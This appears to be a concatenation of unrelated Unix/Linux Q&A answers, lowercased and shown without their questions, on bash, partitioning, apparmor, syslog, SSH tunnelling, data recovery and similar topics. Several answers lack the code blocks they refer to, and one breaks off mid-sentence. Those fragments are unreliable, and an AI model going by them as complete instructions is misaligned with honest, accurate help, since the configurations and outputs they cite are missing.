because the command substitution is run in subshell , so it made no change to the PIPESTATUS variable of the parent shell . from command execution environment documentation : command substitution , commands grouped with parentheses , and asynchronous commands are invoked in a subshell environment that is a duplicate of the shell environment , except that traps caught by the shell are reset to the values that the shell inherited from its parent at invocation . builtin commands that are invoked as part of a pipeline are also executed in a subshell environment . changes made to the subshell environment cannot affect the shell’s execution environment . you can get the expected result if you check the PIPESTATUS variable in the subshell : $ printf '%s\\n' $(echo hello|sed 's/h/m/'|xargs -I{} ls {} 2&gt;/dev/null|sed 's/ /_/'; for i in ${PIPESTATUS[@]}; do echo $i;done) 0 0 123 0 
you can make your own repository with reprepro ( tutorials 1 2 … ) . if all you want to do is avoid installing galculator , an easier method is to make a fake galculator package with equivs . then you can install lxde normally .
assuming the seven columns are a:g and the first row is 1: in h1 enter =COUNTIF(A1:G1;"=a") and copy down . credits to john v at www.oooforum.org .
i have had a similar problem with awesome window manager as well as urxvt , when imagemagick was used to set the background . it got quickly resolved with feedback from the author of awesome - you can see the archive of this conversation on gmane archives - here and further on here . the solution was to change the background setter and i chose to use habak because it was the lightest one . you can also use other , like feh or Esetroot ( belongs to enlightenment wm ) . i think i would recommend you to try feh first , since it seems to be packaged for many distros . side note : in case someone wanted to try out many different bg-setters , here 's a list of those that awsetbg ( bg-setting wrapper script from awesome ) tries to use : Esetroot habak feh hsetroot chbg fvwm-root imlibsetroot display qiv xv xsri xli xsetbg wmsetbg xsetroot note that some of those only come shipped with bigger packages . edit : looking at xsri manpage , i think it might provide best flexibility for your needs .
you can try to use iostat and iotop to observe processes perfoms io . also you can turn on io logging echo 1 &gt; /proc/sys/vm/block_dump to examine what happen more clearly
mangle is for mangling ( modifying ) packets , while filter is intended to just filter packets . a consequence of this , is that in LOCAL_OUT , after traversing the tables and getting the filtering decision , mangle may try to redo the routing decision , assuming the filtering decision is not to drop or otherwise take control of the packet , by calling ip_route_me_harder , while filter just returns the filtering decision . details at net/ipv4/netfilter/iptable_mangle.c and net/ipv4/netfilter/iptable_filter.c .
the following set of commands will limit the outgoing rate for traffic with a source or destination port of 8333 to 160 kbit/s , unless the destination ip is on the local network .
yes , there is a big difference . &amp;&amp; is short-circuiting , so the subsequent command would be executed only if the previous one returned with an exit code of 0 . quoting from the manual : expression1 &amp;&amp; expression2 True if both expression1 and expression2 are true.  on the other hand , a script containing expression1 expression2  would execute the second expression even if the first failed . ( unless you specified the script to exit on error by saying set -e . ) edit : regarding your comment whether : command1; command2  is the same as : command1 command2  the answer is usually . bash parses an entire statement block before evaluating any of it . a ; does not cause the previous command to be evaluated . if the previous command were to have an effect on how the subsequent one would be parsed , then you had notice the difference . consider a file containing aliases , lets call it alias , with an entry : alias f="echo foo"  now consider a script containing : shopt -s expand_aliases source ./alias f  and another one containing : shopt -s expand_aliases; source ./alias; f  then you might think that both would produce the same output . the answer is no . the first one would produce foo but the second one would report : ... f: command not found  to clarify further , it is not expand_aliases that is causing the problem . the problem is due to the fact that a statement like : alias f="echo foo"; f  would be parsed in one go . the shell does not really know what f is , this causes the parser to choke .
the link /dev/$disk points to the whole of a block device , but , on a partitioned disk without unallocated space , the only part which is not also represented in /dev/$disk[num] is the first 2kb-4mb or so - $disk 's partition table . it is just some information written to the raw device in a format that the firmware and/or os can read . different systems interpret it in different ways and for different reasons . i will cover three . on bios systems this table is written in the MBR master boot record format so the firmware can figure out where to find the bootable executable . it reads the partition table because in order to boot bios reads in the first 512 bytes of the partition the table marks with the bootable flag and executes it . those 512 bytes usually contain a bootloader ( like grub or lilo on a lot of linux systems ) that then chainloads another executable ( such as the linux kernel ) located on a partition formatted with a filesystem the loader understands . on efi systems and/or bios systems with newer kernels this partition table can be a GPT guid partition table format . efi firmware understands the fat filesystem and so it looks for the partition the table describes with the efi system partition flag , mounts it as fat , and attempts to execute the path stored in its boot0000-{guid} nvram variable . this is essentially the same task that bios bootloaders are designed to do , and , so long as the executable you wish to load can be interpreted by the firmware ( such as most linux kernels since v . 3.3 ) , obviates their use . efi firmware is a little more sophisticated . after boot , if a partition table is present and the kernel understands it , /dev/${disk}1 is mapped to the 4mb+ offset and ends where the partition table says it does . partitions really are just arbitrary logical dividers like : start of disk | partition table | partition 1 | ... and so on | end of disk  though i suppose it could also be : s.o.d. | p.t. | --- unallocated raw space --- | partition 1 | ... | e.o.d.  it all depends on the layout you define in the partition table - which you can do with tools like fdisk for MBR formats or gdisk for GPT formats . the firmware needs a partition table for the boot device , but the kernel needs one for any subdivided block device on which you wish it to recognize a filesystem . if a disk is partitioned , without the table the kernel would not locate superblocks in a disk scan . it reads the partition table and maps those offsets to links in /dev/$disk[num] . at the start of each partition it looks for the superblock . it is just a few kb of data ( if that ) that tells the kernel what type of filesystem it is . a robust filesystem will distribute backups of its superblock throughout its partition . if the partition does not contain a readable superblock which the kernel understands the kernel will not recognize a filesystem there at all . in any case , the point is you do not really need these tables on any disk that need not ever be interpreted by firmware - like on disks from which you do not boot ( which is also the only workable gpt+bios case ) - and on which you want only a single filesystem . /dev/$disk can be formatted in whole with any filesystem you like . you can mkfs.fat /dev/$disk all day if you want - and probably windows will anyway as it generally does for device types it marks with the removable flag . in other words , it is entirely possible to put a filesystem superblock at the head of a disk rather than a partition table , in which case , provided the kernel understands the filesystem , you can : mount /dev/$disk /path/to/mount/point  but if you want partitions and they are not already there then you need to create them - meaning write a table mapping their locations to the head of the disk - with tools like fdisk or gdisk as mentioned . all of this together leaves me to suggest that your problem is one in these three : your disk has no partition table and no filesystem it was recently wiped , never used , or is otherwise corrupt . your disk 's partition table is not recognized by your os kernel bios and efi are not the only firmware types . this is especially true in the mobile/embedded realm where an sdhc card could be especially useful , though many such devices use layers of less-sophisticated filesystems that blur the lines between a filesystem and a partition table . your disk has no partition table and is formatted with a filesystem not recognized by your os kernel after rereading your comment above i am fairly certain it is the latter case . i recommend you get a manual on that tv , try to find out if you can get whatever filesystem it is using loaded as a kernel module in a desktop linux and mount the disk there .
that message means you do not have sufficient privileges on the system to change the mode of the directory . if sudo is not installed on the system , you will need to gain elevated privileges using su ( you will need the root password ) , when you will be able to use chmod in exactly the way you would on linux - using either absolute or symbolic permissions . if you do not have the root password , you will need to ask someone who has sufficient privileges to make the change for you . depending on local policy , a request to have sudo installed and configured may or may not work . edit from an answer to your other open thread , it seems that sco has a command called asroot , which serves a similar purpose to sudo elsewhere .
there are many ways : esc , shift + c ctrl + o , shift + d shift + end , del shift + end , s do not be afraid of falling back to the normal mode even for a short instant .
basically , you want a daemon that monitors the free memory , and if it falls below a given threshold , it chooses some process and kills them to free up some memory . an obvious question is : how do you choose processes to kill ? an easy answer would be the one with the biggest memory usage , since it is likely that that is the misbehaving " memory hog " , and killing that one process will free up enough memory for many other processes . however , a more fundamental question is : is it really okay to kill such a process to free up memory for others ? how do you know that the one big process is less important than others ? there is no general answer . moreover , if you later try to run that big process again , will you allow it to kick out many other processes ? if you do , will not there be an endless loop of revenge ? actually , the virtual memory mechanism is already doing similar things for you . instead of killing processes , it swaps out some portion of their memory to disk so that others can use it . when the former process tries to use the portion of the memory later , the virtual memory mechanism swaps in the pages back . when this is happening from different process contentiously ( which is called thrashing ) , you need to terminate some processes to free up the memory , or more preferably , supply more memory . when the system starts
ubuntu no longer uses the /var/log/messages file by default . the same information is available in the file /var/log/syslog . you can re-enable logging to /var/log/messages if you would like . syslog is a standard logging facility . it collects messages from various programs , including the kernel . it is usually configured to store these messages by default . how it stores these messages is generally distribution-dependant . /var/log/messages is generally used to store non-critical messages while /var/log/syslog stores everything , including critical and non-critical messages .
after some more searching it turned out what i already suspected : apt itself provides a set of hooks to invoke commands at certain events , which is used by a lot of tools but seems to be barely documented . calling a tool like checkrestart after a package upgrade is fairly simple . one hast just to put the following code line either into /etc/apt/apt.conf or one of the existing files or a new file in /etc/apt/apt.conf.d/: DPkg::Post-Invoke-Success { '/usr/sbin/checkrestart';};  this will call checkrestart every time that dpkg was called by apt ( and of course any other tool that relies on apt , such as aptitude ) and finished successfully .
you could use touch myfile.txt; open myfile.txt . if this is something you will be doing frequently , you could create an alias for it .
from the manual : -I pattern , --ignore=pattern in directories , ignore files whose names match the shell pattern ( not regular expression ) pattern . as in the shell , an initial . in a file name does not match a wildcard at the start of pattern . sometimes it is useful to give this option several times . for example ,  $ ls --ignore='.??*' --ignore='.[^.]' --ignore='#*'  the first option ignores names of length 3 or more that start with . , the second ignores all two-character names that start with . except .. , and the third ignores names that start with # . you can use only shell glob patterns : * matches any number of characters , ? matches any one character , [\u2026] matches the characters within the brackets and \ quotes the next character . the character $ stands for itself ( make sure it is within single quotes or preceded by a \ to protect it from shell expansion ) .
the behavior you want to control ( how windows behave ) is controlled by the window manager , which gets its information from the server 's xrandr extension . neither of these are likely to have any " hooks " that will let you alter anything . this reduces you to hacking the source . altering what the server reports to the window manager seems really ugly -- you do want it to report what it actually sees everywhere else . this leaves editing the window manager ( or hiring someone else to do so , or asking upstream for some support ) . it should not be too unreasonable to hack in a special casing of randr events to treat a 3940x1080 resolution as two 1920x1080s . actually adding a configuration option that might be accepted upstream would be harder , of course . so , unfortunately , i can not think of a solution , unless you are willing to dive into the code .
alias allows a string to be substituted for a word since when it is used as the first word of a simple command , not string for string like you want . you should use variable instead : remoteHost='user@host:destFolder/' scp -r myFolder "$remoteHost" 
add the below 3 lines to squid.conf , and reload squid . should work for ftp upload and download via squid . acl SSL_ports port 443 21 acl ftp proto FTP http_access allow ftp  visit for usefull squid tutorial
mypaint is my favorite alternative to mspaint .
under ubuntu , another way of jailing is apparmor ! it is a path based mandatory access control ( mac ) linux security module ( lsm ) . in ubuntu 10.04 it is enabled by default for selected services . the documentation is quite fragmented . the ubuntu documentation could be . . . better . even the upstream documentation does not give a good introduction . the reference page states : warning : this document is in a very early stage of creation it is not in any shape yet to be used as a reference manual however , getting started is relatively easy . an appamor profile matches a executable path , e.g. /var/www/slave/slave . the default rule of a profile is deny ( which is great ) , if nothing else matches . profile deny-rules match always before allow-rules . an empty profile denies everything . profiles for different binaries are stored under /etc/apparmor.d . apparmor_status displays what profiles are active , what are in enforce-mode ( good ) , or only in complain mode ( only log messages are printed ) . creating a new profile for /var/www/slave/slave is just : aa-genprof /var/www/slave/slave  start in another terminal /var/www/slave/slave and do a typical use case . after it is finished press s and f in the previous terminal . now /etc/apparmor.d contains a profile file var.www.slave.slave . if the slave does some forking the profile is only very sparse - all the accesses of the childs are ignored . anyway , the profile is now active in enforce mode and you can just iteratively trigger actions in the slave and watch tail -f /var/log/messages for violations . in another terminal you edit the profile file and execute aa-enforce var.www.slave.slave after each change . the log displays then : audit(1308348253.465:3586): operation="profile_replace" pid=25186 name="/var/www/slave/slave"  a violation looks like : a profile rule like : /var/www/slave/config r,  would allow the access in the future . this is all pretty straight forward . appamor supports coarse grained network rules , e.g. network inet stream,  without this rule no internet access is possible ( including localhost ) , i.e. with that rule you can use iptables for finer-grained rules ( e . g . based on slave uid ) . another documentation fragment contains something about sub profiles for php scripts . the var . www.slave.slave profile skeleton looks like : with such a profile the slave is not able anymore to call utilities like mail or sendmail .
you can use :verbose set modifiable? to find out if a plugin is setting the option . if the option has been modified by a plugin , it will show Last set from /path/to/plugin/file ( in addition to showing the value ) . maybe you are using the netrw plugin . it comes bundled with vim and handles “editing” local directories ( listing the contents , picking files to view/edit ) and remote file/directory access . i know it twiddles twiddles modifiable ( and some other options ) . there may be a bug in the version bundled with your updated vim . you can check the version number of the active installation of netrw with :echo g:loaded_netrwPlugin . if the problem seems to be related to netrw , you might try installing another released version , or maybe a development version .
" enabling additional executable binary formats " is a message that originates from binfmt-support . as seen above , reinstalling said service is the way to go .
you are doing it right . most people that i know use the script or program name with -t , such that log entries are easy to search . exactly the way you are doing it . i use it the same way . occasionally , i will use the username of a person that called a script instead of the script name , but that is for specific cases . as long as you are using it in a way that makes your log entries recognizable , keep doing it that way .
( converted from question comments ) there were actually three parts to this equation : sendmail , procmail , and exchange : exchange : on accepting a piece of mail for delivery , it appears to reformat a plain text message , encoding and wrapping its lines to 75 characters . sendmail : an old ( but known ) behaviour was being followed in that mail with a bare period on a line was interpreted as end-of-message and then delivered , effectively truncating the actual mail body . procmail : according to docs , it is supposed to invoke sendmail with flags that force it to ignore bare periods . it was not doing this and not honouring explicit config file directives , either . the short term solution : passing -oi -oignoredots=t to all redelivery recipes . the long term solution : an upgrade of our site 's procmail installation which now honours config settings and ignores the bare period ( passed flags are no longer required ) . the hard wrap came into play because , when exchange encoded the previously plain text message , it introduced =20 which probably allowed the period to be wrapped by itself and left alone on a line .
update based on comment :
what it does is entirely application specific . when you press ctrl + c , the terminal emulator sends a sigint signal to the foreground application , which triggers the appropriate " signal handler " . the default signal handler for sigint terminates the application . but any program can install its own signal handler for sigint ( including a signal handler that does not stop the execution at all ) . apparently , vlc installs a signal handler that attempts to do some cleanup / graceful termination upon the first time it is invoked , and falls back to the default behavior of instantly terminating execution when it is invoked for a second time .
run pgrep -f "ssh.*-D" and see if that returns the correct process id . if it does , simply change pgrep to pkill and keep the same options and pattern also , you should not use kill -9 aka sigkill unless absolutely necessary because programs can not trap sigkill to clean up after themselves before they exit . i only use kill -9 after first trying -1 -2 and -3 .
till linux 2.6.22 , bzImage contained : bbootsect ( bootsect.o ) : bsetup ( setup.o ) bvmlinux ( head.o , misc.o , piggy.o ) linux 2.6.23 merged bbootsect and bsetup into one ( header.o ) . at boot up , the kernel needs to initialize some sequences ( see the header file above ) which are only necessary to bring the system into a desired , usable state . at runtime , those sequences are not important anymore ( so why include them into the running kernel ? ) . System.map stands in relation with vmlinux , bzImage is just the compressed container , out of which vmlinux gets extracted at boot time ( => bzImage does not really care about System.map ) . linux 2.5.39 intruduced CONFIG_KALLSYMS . if enabled , the kernel keeps it is own map of symbols ( /proc/kallsyms ) . System.map is primary used by user space programs like klogd and ksymoops for debugging purposes . where to put System.map depends on the user space programs which consults it . ksymoops tries to get the symbol map either from /proc/ksyms or /usr/src/linux/System.map . klogd searches in /boot/System.map , /System.map and /usr/src/linux/System.map . removing /boot/System.map generated no problems on a linux system with kernel 2.6.27.19 .
first , cgroups are not used to isolate an application from others on a system . they are used to manage resource usage and device access . it is the various namespaces ( pid , uts , mount , user . . . ) that provide some ( limited ) isolation . moreover , a process launched inside a docker container will probably not be able to manage the apparmor profile it is running under . the approach currently taken is to setup a specific apparmor profile before launching the container . it looks like the libcontainer execution driver in docker supports setting apparmor profiles for containers , but i can not find any example or reference in the doc . apparently apparmor is also supported with lxc in ubuntu . you should write an apparmor profile for your application and make sure lxc/libcontainer/docker/ . . . loads it before starting the processes inside the container . profiles used this way should be enforced , and to test it you should try an illegal access and make sure it fails . there is no link between the binary and the actually enforced profile in this case . you have to explicitly tell docker/lxc to use this profile for your container . writing a profile for the mysql binary will only enforce it on the host , not in the container .
i wrote one-liner based on tobi hahn answer . for example , you want to know what device stands for ata3: ata=3; ls -l /sys/block/sd* | grep $(grep $ata /sys/class/scsi_host/host*/unique_id | awk -F'/' '{print $5}')  it will produce something like this lrwxrwxrwx 1 root root 0 Jan 15 15:30 /sys/block/sde -&gt; ../devices/pci0000:00/0000:00:1f.5/host2/target2:0:0/2:0:0:0/block/sde 
you should familiarize yourself with the different branches : longterm there are usually several " longterm maintenance " kernel releases provided for the purposes of backporting bugfixes for older kernel trees . only important bugfixes are applied to such kernels and they do not usually see very frequent releases , especially for older trees . you are looking at two different longterm kernel versions . they provide you a 3.10 and a 3.12 kernel because the latest one is 3.14 but you might need something to work like it did in one of those earlier kernels . having a long term feature freeze on a particular kernel version enables people to get bug fixes without changing anything that would be user- or admin-facing . does 3.12 have 3.10 features ? yes and no . features are added , remove , and changed all the time . the only way to know for sure is to check the release notes for each kernel version to see if the feature you are concerned about is in there somewhere . all we can really say that the 3.12 represents a later stage of development than the 3.10 kernel . the dates beside them just reflect the last time someone updated that particular branch . if you want the latest and greatest you should look at 3.14
simply because there is no such thing as a &amp;(...) operator in bash . bash only implements a subset of ksh patterns with extglob . here you want : grep -Fwn Foo /**/src/**/!(Foo).@(h|cpp)  with ksh93 , you can use &amp; this way : grep -Fwn Foo /**/src/@(*.@(h|cpp)&amp;!(Foo*))  zsh has a and-not operator with extendedglob: grep -Fwn Foo /**/src/(*.(h|cpp)~Foo*) 
please see man usermod . an example would be sudo usermod -s /bin/bash username .
after a little more searching i have found the solution . remove/rename the files associated with the errors : update the signature : gpg --keyserver keyserver.ubuntu.com --recv 40976EAF437D05B5  rebuild the software cache : cd /var/lib/apt sudo mv lists lists.old sudo mkdir -p lists/partial sudo apt-get update  it is probably possible to skip the first step by simply moving the lists , but i figured it best to describe the entire process i used to remove the errors . i hope this helps anyone else having this problem .
solution 1: from your pc on network a , create a reverse ssh tunnel with something like putty by connecting to a linux host on network b . the local port should be 3389 , the remote host 127.0.0.1 and the port is arbitrary ( lets use 6000 as an example ) . then from your pc on network b , use putty to connect to the same linux host , and do a forward tunnel . local port should be set to something other than 3389 ( as microsoft rdp client will not allow connections to localhost , but it will allow connections to localhost on an arbitrary port ) . so lets reuse the same port number of 6000 , the remote ip should be 127.0.0.1 and remote port 6000 . you then point the rdp client at 127.0.0.1:6000 . in effect you connect to port 6000 on pc in network b . putty forwards that to the linux host , which has been set to forward it to 127.0.0.1 on port 6000 . the putty connection from the pc on network a listens on 6000 and forwards it to 127.0.0.1 on pc a to port 3389 which rdp then accepts the connection . solution 2: setup an sshd on the pc on network b , and then you only have to do a single reverse port forward . there is bitvise sshd which runs on windows and is free for non-business use . bitvise also do a separate client that handles rdp tunneling in conjunction with a winsshd . the nice thing about this solution it that is saves usernames , settings ( like full screen and so forth ) , and can be launched from a save file and will stop you from having to set up/remember to connect the port forwards before using rdp .
awk -F '","' 'BEGIN {OFS=","} { if (toupper($5) == "STRING 1") print }' file1.csv &gt; file2.csv  output i think this is what you want .
man pages for the standard c library are included in the man-pages package . for the c++ stl library the man-pages and html documentation are included in the libstdc++-docs packages . thus , yum install man-pages libstdc++-docs  should install them . you can test if they are available via : man std::iostream man fopen  kind of off-topic : imho the libstdc++ documentation ( especially the man pages ) is not that convenient to browse - i usually use http://en.cppreference.com/w/ which is very convenient to navigate and up-to-date - either i use the integrated search feature or i use google search like ' c++ reference iostream ' and the first hit usually points to a cppreference . com page anyways . it is also available as offline copy . edit : tested man std::iostream on a fc 14 box with libstdc++-docs installed , and surprisingly , it could not find it . using yum povides '*/std::iostream*' prints that the libstdc++-docs package provides the corresponding man-page file , but it installs it to an unusual location : /usr/share/man/man3/man3/std::iostream.3.gz  thus , calling man like man -M /usr/share/man/man3 std::iostream  shows the man-page . looks like a bug in the fc 14 libstdc++-docs package to me .
use sh -c 'commands' as the command , e.g. : /usr/bin/time --output=outtime -p sh -c 'echo "a"; echo "b"' 
$ readlink /sys/class/net/wlan0/device/driver ../../../../bus/pci/drivers/ath5k  in other words , the /sys hierarchy for the device ( /sys/class/net/$interface/device ) contains a symbolic link to the /sys hierarchy for the driver . there you will also find a symbolic link to the /sys hierarchy for the module , if applicable . this applies to most devices , not just wireless interfaces .
libgmp.so.3 does not have anything to do with haskell . it belongs to the gmp library , which in centos should be available in the package gmp ( or similar , i do not have a centos box to test right now ) .
the print server running cups is the only machine that needs to have the drivers . read about cups on wikipedia for example - in overview section it states this quite clearly : cups allows printer manufacturers and printer-driver developers to more easily create drivers that work natively on the print server . processing occurs on the server , allowing for easier network-based printing than with other unix printing systems . with samba installed , users can address printers on remote windows computers and generic postscript drivers can be used for printing across the network . otherwise , what would be the be the real benefit of running cups ?
we should use /boot/grub/grub.conf , and /boot/grub/menu.lst should be a symlink to grub.conf . these files are initially created by anaconda during the install . this is logged in /var/log/anaconda.program.log . we can see that this anaconda execution uses grub.conf , not menu.lst:
that usually happens when you have not installed the php package did you installed this ? : sudo apt-get install php5 libapache2-mod-php5
host + f1 , default host key is right ctrl .
by default all syslog daemons read incoming messages from : /dev/log additionally syslog can bind to udp socket on port 514 . see /etc/services:: $ cat /etc/services | grep syslog syslog 514/udp  second is mostly used for passing logs between syslog daemons . i.e. one logging server per cluster . as a programmer you do not directly write to /dev/log but instead you call a posix function syslog:: in fact all higher level languages give you an abstraction layer on top of these functions .
this works for me on fedora 19 . i would debug your issue further using strace to confirm that openssl is picking up the added .pem files from the directory you think it is . $ strace -s 2000 -o ssl.log openssl s_client -connect vimeo.com:443 &lt; /dev/null  you can then interrogate the resulting log file , ssl.log , looking to find out where openssl the executable is accessing it is pem files . i would also pay special attention to the permissions of the files you have added as well as making sure that openssl 's configuration file , /etc/pki/tls/openssl.cnf , is referencing the correct directory :
using cat since your file is short , you can use cat . cat filename  using less if you have to view the contents of a longer file , you can use a pager such as less . less filename  you can make less behave like cat when invoked on small files and behave normally otherwise by passing it the -F and -X flags . less -FX filename  i have an alias for less -FX . you can make one yourself like so : alias aliasname='less -FX'  if you add the alias to your shell configuration , you can use it forever . using od if your file contains strange or unprintable characters , you can use od to examine the characters . for example , $ cat file \xd0Z4\xa0?o=\xf7j\xef $ od -c test 0000000 202 233 320 K j 357 024 J 017 h Z 4 240 ? o 0000020 = 367 \\n 0000023 
as documented in the hosts_options(5) man page , the standard output is redirected to /dev/null , so that there is no chance for you to get the output from echo . and as you want the exit status to be taken into account , you should use aclexec instead of spawn . indeed the man page says for aclexec: " the connection will be allowed or refused depending on whether the command returns a true or false exit status . "
with mount --bind , a directory tree exists in two ( or more ) places in the directory hierarchy . this can cause a number of problems . backups and other file copies will pick all copies . it becomes difficult to specify that you want to copy a filesystem : you will end up copying the bind-mounted files twice . searches with find , grep -r , locate , etc . , will traverse all the copies , and so on . you will not gain any “increased functionality and compatibility” with bind mounts . they look like any other directory , which most of the time is not desirable behavior . for example , samba exposes symbolic links as directories by default ; there is nothing to gain with using a bind mount . on the other hand , bind mounts can be useful to expose directory hierarchies over nfs . you will not have any performance issues with bind mounts . what you will have is administration headaches . bind mounts have their uses , such as making a directory tree accessible from a chroot , or exposing a directory hidden by a mount point ( this is usually a transient use while a directory structure is being remodeled ) . do not use them if you do not have a need . only root can manipulate bind mounts . they can not be moved by ordinary means ; they lock their location and the ancestor directories . generally speaking , if you pass a symbolic link to a command , the command acts on the link itself if it operates on files , and on the target of the link if it operates on file contents . this goes for directories too . this is usually the right thing . some commands have options to treat symbolic links differently , for example ls -L , cp -d , rsync -l . whatever you are trying to do , it is far more likely that symlinks are the right tool , than bind mounts being the right tool .
when you see the handlers like gphoto2:// and smb:// these are special interfaces that the gnome desktop or whatever file browser you are using is making available to access these devices . in the case of gphoto2 , the desktop is using the application gphoto2` lsof the only way i can think to gain access to a mount such as this would be to mount it as you did before using nautilus or whatever file browser , and then using a tool such as lsof to see what files/devices are opened by nautilus . $ lsof -p $(pgrep nautilus)  but if you are having to connect to your phone via gphoto2 then you are likely not mounting the device a a mass storage device but rather a ptp - picture transfer protocol . there is a linux fuse implementation for ptp too . gvfs ? i would also look in your $HOME directory for a sub-directory called .gvfs . usually when gnome or nautilus are doing the mounting this directory is created as a convenience . in newer versions of gnome ( 3+ ) this directory has moved and is now here , /run/user/$UID/gvfs . example note : that is a environment variable $UID that is often set in bash on most modern systems . if it is not set you can find your user 's id like so : $ id uid=1000(saml) gid=1000(saml) groups=1000(saml),10(wheel) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 
data recovery is a tricky thing , and more suited to a few books than a use answer . there are lots of myths , legends and voodoo recipes out there . : ) if the disk appears to be talking on the bus , perhaps you can get some of the data . look up gnu ddrescue . it does block-level rescue of a disk or individual partitions . there is also ‘plain’ ddrescue , which is nearly identical . i have used both . you will need ddrescue , the dying disk and another disk of equal or larger size . if you want to rescue disk-to-disk , the disk should probably be identical in size . if not , you can do a disk-to-image copy and then use losetup , dmsetup and mount ( with the -o loop option ) to get file-level access to the partitions . ddrescue works a bit like dd ( hence the name ) , but is designed to work around bad sections of a disk . first it copies large chunks , leaving holes ( sparse files , if you are saving to a filesystem ) where the errors are . it then divides and conquers , copying progressively smaller areas of the problem parts of the disk , until only the failed bad sectors are left uncopied . it can also retry its operations if the disk is behaving erratically . also , you can stop it and restart it whenever you feel like , provided you give it a logfile ( which is human readable and tells you what disk blocks are damaged ) . here 's a sample invocation : ddrescue /dev/sdg /mnt/sdg.img /mnt/sdg-ddrescue.log  you can interrupt it with Ctrl-C and restart it whenever you want . check the manpage for additional options if the rescue operation is not going well .
there is not a way , and i think a script is the only way . the reason being , what if you had a file called setup . cfg:11 and wanted to edit it ? here is a quick script that does what you want as a oneliner . . . editline() { vim ${1%%:*} +${1##*:}; } 
there is apache user instead of www-data in centos .
you fell into the buffering gotcha . perl buffers its output and only writes out to disk when the buffer is full . buffering is a good thing performance-wise , but at low data rates can be confusing . if you wait long enough you will notice your file being written ( check with tail -F File_1 ) . i believe standard buffer is 4kb in size . add $|=1 like below to disable buffering in perl : vmstat 1 | perl -e '$| = 1; while (&lt;&gt;) { print localtime() . ": $_"; }' &gt; /tmp/fileetje 
first try to umount and mount is again as read write . if that do not work create a new filesystem and/or partitiontable , and for that you can use fdisk and mkfs . ext4 or mkfs . vfat .
inkscape , being a gtk application , uses the glib g_get_home_dir function to find the user 's home directory . as documented in that link , g_get_home_dir does not consult $HOME , but rather /etc/passwd . you had have to patch inkscape to check $HOME first ( as shown in that link ) .
you can check whether the library is linked against pthread at least by using ldd . on debian squeeze , my version is linked against pthread . based on a quick net search , it looks like the program would have to link against the gcc openmp support library ( gomp ) for openmp support , so you could use ldd to check for something with " libgomp " in it as well .
yeah you already answered it . the subsequent is for subsequent repeats of the report by the same iostat command , not between executions of the command ( those are always since boot ) .
last time i used convert for such a task i explicitly specified the size of the destination via resizing : $ convert a.png b.png -compress jpeg -resize 1240x1753 \ -units PixelsPerInch -density 150x150 multipage.pdf  where 1240x1753 are exactly din a4 when 150 dpi is chosen . i computed the values using bc and looked up the dimensions in inches in the wikipedia article . the resize argument specifies the maximal page size . this assumes that convert by default does not change the aspect ratio with the resize operation - which is the case : resize will fit the image into the requested size . it does not fill , the requested box size . ( imagemagick manual ) thus the -page a4 should be added , such that din a4 is specified in the pdf header : update : tested it again with another viewer , and it seems that one has to use -repage a4 instead of -page a4 to get the right page information into the resulting pdf .
qnx neutrino allows and even defaults to union mounts : if you mount two different filesystems on the same location , the files in both are present , except that files in the second filesystem shadow files with the same names in the first filesystem . this is different from typical unix behavior , where mounting a filesystem shadows everything below the mount point . many unix variants have some way of performing a union mount nowadays ( e . g . unionfs , or freebsd 's mount -o union ) , but it is not a traditional feature . on normal unix systems , df /path/to/file tells you what filesystem a file is on . i expect it to apply to qnx union mounts as well , but i do not know for sure . unless you want to perform a union mount , which you apparently do not , always mount a filesystem to an empty directory . mkdir /mountpoint2 fs-cifs //hostname:hostipaddress:/sharename /mountpoint2 login password &amp; 
-U can only upgrade packages with the same name , and the two packages have different names . one is called VirtualBox-4.0 , and the other is called VirtualBox-4.1 . VirtualBox-4.0-4.0.12_72916_fedora14-1 .x86_64 ^name ^version ^release ^arch 
the only two line editing interfaces currently available in bash are vi mode and emacs mode , so all you need to do is set emacs mode again . set -o emacs 
how about simply sed -i 's@^\([^{]\+\)\(\.to[^{]\+\)}\s*$@\1\2@' your_file  with perl ( for better readability ) :
you could use brace expansion . but it is ugly . you need to use eval , since brace expansion happens before ( array ) variable expansion . and "${var[*]}" with IFS=, to create the commas . consider a command to generate the string echo {a,b,c}+{1,2,3}  assuming the arrays are called letters and numbers , you could do that using the "${var[*]}" notation , with IFS=, to insert commas between the elements instead of spaces . letters=(a b c) numbers=(1 2 3) IFS=, echo {"${letters[*]}"}+{"${numbers[*]}"}  which prints {a,b,c}+{1,2,3}  now add eval , so it runs that string as a command eval echo {"${letters[*]}"}+{"${numbers[*]}"}  and you get a+1 a+2 a+3 b+1 b+2 b+3 c+1 c+2 c+3 
first of all - the oracle-description sucks . the proper way to use snmp for an application ( java is a application with regards to the operating system ) is to register it as sub-agent to the os-snmp-service ( in case of linux : snmpd ) . there has to be a way to accomplish that . afterwards you can use the snmpd-security settings ( see the man-pages of snmpd ) to restrict access to that part of the mib .
one way using sed: content of script . sed : command : sed -nf script.sed infile  output : ('chair','chair'),('table','table'),('pen','pen'),('desk','desk') 
the worst and most likely case is that you will lose everything . if you have a single logical volume spanning both drives , and you lose one drive with no mirroring , you have essentially wiped out half the file system . from this point , it gets mildly better depending on what file system you are running on your volume . assuming that you are not using stripping , which will kill any chance you have , you may be able to get some of your data back by running recovery software on the second drive . i do not have personal experience with that case , but it should be theoretically possible to get some or most of the files that were exclusively on the still functional drive if you are using one of the more ' robust ' file systems ( ie . ext? ) . your mileage will vary depending on what filesystem you are using on top of lvm and how your files are arranged on the disks though . if they are fragmented across both disks then you will still lose those files too .
for backing up files between two computers , rysnc is usually the way to go . if the files may be changed on either computer , unison might be a better way to go . you can run either regularly via a cron job or manually when needed ( more robust for unison ) . of course you will have to set up a password-less ssh login to the target machine first . if you want to sync to a usb device when it is plugged in , you can always create a udev rule ( if that is what your system uses ) which runs a script to mount the device and do an rsync every time it is plugged in . if doing this , be sure that it does not conflict with any other automatic mounting system that may pick the device up . to do this you would first find out the udev properties of the device as follows : udevadm info --name=/path/to/device --query=property  then you would put a .rules file in /etc/udev/rules.d ( depending on system ) containing something like this :  ENV{ID_SERIAL}=="device_id_serial", ACTION=="add", RUN+="/path/to/script"  where device_id_serial is the ID_SERIAL for your device . note this is only a very rough outline of what you can do , i have not tested the above ( add may not be the correct action ) . you can always ask another question on any of the above if you are stuck .
